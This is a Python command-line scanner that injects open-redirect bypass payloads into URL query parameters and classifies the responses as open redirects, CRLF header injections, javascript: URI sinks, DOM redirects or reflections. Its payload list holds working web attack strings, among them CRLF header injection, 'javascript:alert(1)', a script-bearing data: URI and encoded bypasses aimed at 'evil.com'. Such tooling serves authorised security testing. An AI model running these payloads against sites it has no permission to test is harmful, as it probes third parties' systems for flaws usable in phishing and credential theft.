#!/usr/bin/env python3
"""openredirect - probe parameterised URLs for open redirects and redirect sinks.

Reads candidate URLs (one per line, discovered during URL discovery) on stdin.
For every query parameter that looks like a redirect target (or, optionally,
every parameter) it injects a set of bypass payloads that all point at a canary
host and inspects the response:

  * open_redirect     server 3xx Location points at the canary host
  * header_injection  CRLF payload injected a response header (e.g. X-Injected)
  * javascript_uri    javascript:/data: payload reached an href/src/location sink
  * dom_redirect      canary reflected next to a client-side redirect sink
  * reflection        canary reflected in the body (no sink)

Output is JSON lines on stdout:

  * findings: {"url":...,"parameter":...,"type":...,"payload":...,"status":...,"location":...,"evidence":...}
  * summary:  {"event":"done","urls":N,"requests":R,"findings":F}

Only the standard library is used so the image is small and builds offline.
"""
from __future__ import annotations

import argparse
import concurrent.futures
import http.client
import json
import os
import ssl
import sys
import threading
import time
from urllib.parse import unquote_plus, urlsplit

MAX_BODY = 64 * 1024  # bytes of response body to inspect
DEFAULT_CANARY = "evil.com"
USER_AGENT = "Mozilla/5.0 (compatible; openredirect/1.0)"

# Parameter names that commonly carry a redirect / return URL. Matched
# case-insensitively. Mirrors the "gf redirect" parameter set.
REDIRECT_PARAMS = frozenset(
    p.lower()
    for p in (
        "redirect", "redirecturl", "redirect_url", "redirectto", "redirect_to",
        "redirect_uri", "redirect-uri", "redirecturi", "redir", "redirurl",
        "redir_url", "rurl", "url", "uri", "next", "nexturl", "next_url",
        "return", "returnurl", "return_url", "returnto", "return_to",
        "returnpath", "return_path", "goto", "go", "dest", "destination",
        "destinationurl", "destination_url", "target", "targeturl",
        "target_url", "continue", "continueurl", "continue_url", "callback",
        "callbackurl", "callback_url", "u", "link", "out", "outurl", "view",
        "forward", "forwardurl", "forward_url", "to", "r", "ref", "reference",
        "image", "imageurl", "image_url", "file", "fileurl", "file_url",
        "page", "pageurl", "page_url", "login", "logout", "signin", "signout",
        "checkout", "checkouturl", "checkout_url", "success", "successurl",
        "success_url", "cancel", "cancelurl", "cancel_url", "oauth",
        "oauthcallback", "oauth_callback", "oauth_redirect", "sso", "service",
        "host", "hostname", "domain", "domainurl", "domain_url", "sp",
        "action", "back", "backurl", "back_url", "jump", "jumpurl",
        "site", "returnUrl", "retUrl", "targetUrl", "urlredirect", "uport",
    )
)

# Payload templates. {c} is the canary host, {h} the target URL's own host.
PAYLOADS = (
    "https://{c}",
    "http://{c}",
    "//{c}",
    "///{c}",
    "////{c}",
    "\\\\{c}",
    "\\/{c}",
    "/\\{c}",
    "https:{c}",
    "https:/{c}",
    "https://{h}@{c}",
    "https://{c}#{h}",
    "https://{c}?{h}",
    "https://{c}/{h}",
    "https://{c}.{h}",
    "https://{c}@{h}",
    "@{c}",
    "https://{c}%23{h}",
    "https://{c}%3F{h}",
    "https://{c}%00.{h}",
    "https%3A%2F%2F{c}",
    "https%253A%252F%252F{c}",
    "%2F%2F{c}",
    "//{c}%2f..",
    "/%09/{c}",
    "/%09%09/{c}",
    "https://{c}%0d%0aLocation:%20https://{c}",
    "https://{c}%0d%0aX-Injected:1",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://{c}/%2F..",
)

# Client-side redirect sinks used to distinguish a DOM redirect candidate from a
# plain reflection.
SINKS = (
    "window.location",
    "location.href",
    "location.replace",
    "location.assign",
    "document.location",
    "location=",
    "http-equiv=\"refresh\"",
    "http-equiv=refresh",
)

PRINT_LOCK = threading.Lock()


def emit(obj: dict) -> None:
    line = json.dumps(obj, ensure_ascii=False)
    with PRINT_LOCK:
        sys.stdout.write(line + "\n")
        sys.stdout.flush()


def params_of(query: str) -> list[str]:
    names: list[str] = []
    for pair in query.split("&"):
        if not pair:
            continue
        name = unquote_plus(pair.split("=", 1)[0])
        if name and name not in names:
            names.append(name)
    return names


def replace_param(query: str, param: str, payload: str) -> str:
    out: list[str] = []
    for pair in query.split("&"):
        if not pair:
            continue
        name = pair.split("=", 1)[0]
        if unquote_plus(name).lower() == param.lower():
            out.append(f"{name}={payload}")
        else:
            out.append(pair)
    return "&".join(out)


class Findings:
    """Accumulates per-run counters under a lock."""

    def __init__(self) -> None:
        self.lock = threading.Lock()
        self.requests = 0
        self.findings = 0

    def add_request(self) -> None:
        with self.lock:
            self.requests += 1

    def add_finding(self) -> None:
        with self.lock:
            self.findings += 1


def make_connection(scheme: str, host: str, port: int, timeout: float) -> http.client.HTTPConnection:
    if scheme == "https":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
    return http.client.HTTPConnection(host, port, timeout=timeout)


def request(parts, query: str, timeout: float) -> tuple[int, list[tuple[str, str]], str]:
    """Send one GET without following redirects, returning (status, headers, body)."""
    scheme = parts.scheme or "http"
    host = parts.hostname or ""
    port = parts.port or (443 if scheme == "https" else 80)
    path = parts.path or "/"
    if query:
        path = f"{path}?{query}"

    conn = make_connection(scheme, host, port, timeout)
    try:
        conn.request("GET", path, headers={"User-Agent": USER_AGENT, "Accept": "*/*"})
        resp = conn.getresponse()
        status = resp.status
        headers = resp.getheaders()
        raw = resp.read(MAX_BODY + 1)
        body = raw[:MAX_BODY].decode("utf-8", errors="replace")
    finally:
        conn.close()
    return status, headers, body


def location_host(location: str) -> str:
    """Resolve the host a browser would navigate to for a Location header value.

    Returns "" when the location stays on the same origin (relative path) or is
    a scheme that does not navigate (javascript:, data:, ...). Browsers normalise
    backslashes to forward slashes for special schemes, so ``\\\\evil.com`` and
    ``\\/evil.com`` are treated as protocol-relative.
    """
    if not location:
        return ""
    l = location.strip()
    low = l.lower()
    if low.startswith(("//", "\\\\", "\\/", "/\\")):
        rest = l.replace("\\", "/").lstrip("/")
        host = rest.split("/")[0].split("?")[0].split("#")[0]
        return host.lower()
    p = urlsplit(l)
    if p.scheme.lower() in ("javascript", "data", "mailto", "tel"):
        return ""
    if p.netloc:
        return (p.hostname or "").lower()
    if p.scheme:
        rest = l[len(p.scheme) + 1:]
        if rest.startswith("//"):
            rest = rest[2:]
        host = rest.split("/")[0].split("?")[0].split("#")[0]
        return host.lower()
    return ""


def detect(host: str, status: int, headers: list[tuple[str, str]], body: str, payload: str, canary: str) -> tuple[str, str, str] | None:
    """Return (finding_type, location, evidence) or None."""
    lowered = [(name.lower(), value) for name, value in headers]
    location = ""
    for name, value in lowered:
        if name == "location":
            location = value

    # 1. Confirmed open redirect: the Location resolves to the canary host.
    #    Only confirmed when the effective host is the canary; a bare substring
    #    in a relative path (e.g. /search?q=evil.com) is not an off-site redirect.
    if location:
        resolved_host = location_host(location)
        if canary.lower() in resolved_host:
            return ("open_redirect", location, f"{status} Location: {location}")

    # 2. CRLF header injection.
    if "%0d%0a" in payload.lower() or "%0a%0d" in payload.lower():
        for name, value in lowered:
            if name == "x-injected":
                return ("header_injection", "", f"injected header {name}: {value}")
            if name != "location" and canary.lower() in value.lower():
                return ("header_injection", location, f"injected header {name}: {value}")

    low_body = body.lower()
    low_payload = payload.lower()
    low_canary = canary.lower()

    # 3. javascript:/data: payload reached a sink (href/src/location).
    if low_payload.startswith(("javascript:", "data:")):
        idx = low_body.find(low_payload)
        if idx >= 0:
            window = low_body[max(0, idx - 40): idx + len(low_payload) + 40]
            if any(tok in window for tok in ("href", "src", "location", "<a ", "action=")):
                return ("javascript_uri", "", f"sink near: {window.strip()[:160]}")

    # 4. DOM redirect: canary reflected next to a client-side redirect sink.
    canary_idx = low_body.find(low_canary)
    if canary_idx >= 0:
        for sink in SINKS:
            si = low_body.find(sink)
            if si >= 0 and abs(si - canary_idx) < 200:
                start = max(0, min(si, canary_idx) - 40)
                end = max(si, canary_idx) + len(sink) + 80
                return ("dom_redirect", "", body[start:end].strip()[:200])
        # 5. Plain reflection.
        start = max(0, canary_idx - 40)
        end = canary_idx + len(canary) + 80
        return ("reflection", "", body[start:end].strip()[:200])

    return None


def process(url: str, canary: str, test_all: bool, timeout: float, deadline: float, stats: Findings) -> None:
    if time.monotonic() >= deadline:
        return

    parts = urlsplit(url)
    if not parts.query or not parts.hostname:
        return

    all_params = params_of(parts.query)
    if test_all:
        params = all_params
    else:
        params = [p for p in all_params if p.lower() in REDIRECT_PARAMS]
    if not params:
        return

    host = parts.hostname
    for param in params:
        if time.monotonic() >= deadline:
            return
        for template in PAYLOADS:
            if time.monotonic() >= deadline:
                return
            payload = template.format(c=canary, h=host)
            query = replace_param(parts.query, param, payload)
            stats.add_request()
            try:
                status, headers, body = request(parts, query, min(timeout, max(0.5, deadline - time.monotonic())))
            except Exception:  # noqa: BLE001 - unreachable host / bad payload
                continue
            found = detect(host, status, headers, body, payload, canary)
            if found is None:
                continue
            ftype, location, evidence = found
            stats.add_finding()
            emit({
                "url": url,
                "parameter": param,
                "type": ftype,
                "payload": payload,
                "status": status,
                "location": location,
                "evidence": evidence,
            })


def main() -> None:
    parser = argparse.ArgumentParser(description="Probe parameterised URLs for open redirects.")
    parser.add_argument("--root", default="", help="in-scope root domain (informational)")
    parser.add_argument("--canary", default=DEFAULT_CANARY, help=f"canary host injected into payloads (default {DEFAULT_CANARY})")
    parser.add_argument("--workers", type=int, default=8, help="concurrent URL workers (default 8)")
    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout seconds (default 10)")
    parser.add_argument("--deadline", type=float, default=150.0, help="overall wall-clock budget in seconds (default 150)")
    parser.add_argument("--test-all-params", action="store_true", help="test every query parameter, not just redirect-like names")
    args = parser.parse_args()

    urls = [line.strip() for line in sys.stdin if line.strip()]
    if not urls:
        return

    canary = args.canary.strip() or DEFAULT_CANARY
    workers = max(1, min(args.workers, 32))
    deadline = time.monotonic() + max(1.0, args.deadline)
    stats = Findings()

    pool = concurrent.futures.ThreadPoolExecutor(max_workers=workers)
    futures = [pool.submit(process, url, canary, args.test_all_params, args.timeout, deadline, stats) for url in urls]
    try:
        for _ in concurrent.futures.as_completed(futures, timeout=max(0.0, deadline - time.monotonic())):
            pass
    except concurrent.futures.TimeoutError:
        pass
    finally:
        pool.shutdown(wait=False)

    emit({"event": "done", "urls": len(urls), "requests": stats.requests, "findings": stats.findings})
    with PRINT_LOCK:
        sys.stdout.flush()
    sys.stderr.flush()
    os._exit(0)


if __name__ == "__main__":
    main()
